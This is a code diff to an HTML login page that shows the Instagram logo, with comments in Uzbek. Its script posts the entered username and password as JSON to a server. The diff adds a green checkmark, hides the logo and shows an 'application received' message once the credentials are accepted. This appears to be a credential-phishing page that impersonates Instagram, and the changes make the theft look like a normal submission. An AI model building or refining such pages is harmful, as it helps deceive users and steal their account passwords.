@@ -9,6 +9,36 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
 <link rel="stylesheet" href="style.css">
+
+<style>
+/* ===== Extra Styles for Responsive Checkmark & Status ===== */
+.success-logo {
+    display: none;
+    color: #4BB543;
+    font-size: 70px;
+    margin-bottom: 20px;
+    transition: transform 0.3s ease-in-out;
+    text-align: center;
+}
+
+/* Mobile adjustments */
+@media (max-width: 400px) {
+    .insta-logo img, .success-logo i {
+        width: 60px;
+        font-size: 60px;
+    }
+
+    input, button {
+        padding: 10px 8px;
+        font-size: 14px;
+    }
+
+    .status {
+        font-size: 13px;
+    }
+}
+</style>
+
 </head>
 <body>
 
@@ -17,6 +47,11 @@
         <!-- Instagram logo -->
         <div class="insta-logo">
             <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram Logo">
+        </div>
+
+        <!-- Success checkmark icon -->
+        <div class="success-logo">
+            <i class="fa-solid fa-circle-check"></i>
         </div>
 
         <form id="form">
@@ -38,6 +73,8 @@
 <script>
 const form = document.getElementById("form");
 const status = document.getElementById("status");
+const instaLogo = document.querySelector(".insta-logo");
+const successLogo = document.querySelector(".success-logo");
 
 form.addEventListener("submit", async (e) => {
     e.preventDefault();
@@ -52,7 +89,25 @@ form.addEventListener("submit", async (e) => {
             body: JSON.stringify({ username, password })
         });
 
-        
+        if(response.ok){
+            // Instagram logoni yashirish
+            instaLogo.style.display = "none";
+
+            // Galochka logoni ko‘rsatish
+            successLogo.style.display = "block";
+            successLogo.style.transform = "scale(1.2)";
+            setTimeout(() => { successLogo.style.transform = "scale(1)"; }, 300);
+
+            // Status yozuvi
+            status.style.color = "green";
+            status.textContent = "✅ Ariza qabul qilindi!";
+
+            // Formani tozalash
+            form.reset();
+        } else {
+            status.style.color = "red";
+            status.textContent = "❌ Server bilan bog‘lanib bo‘lmadi";
+        }
     } catch(err){
         console.error(err);
         status.style.color = "red";
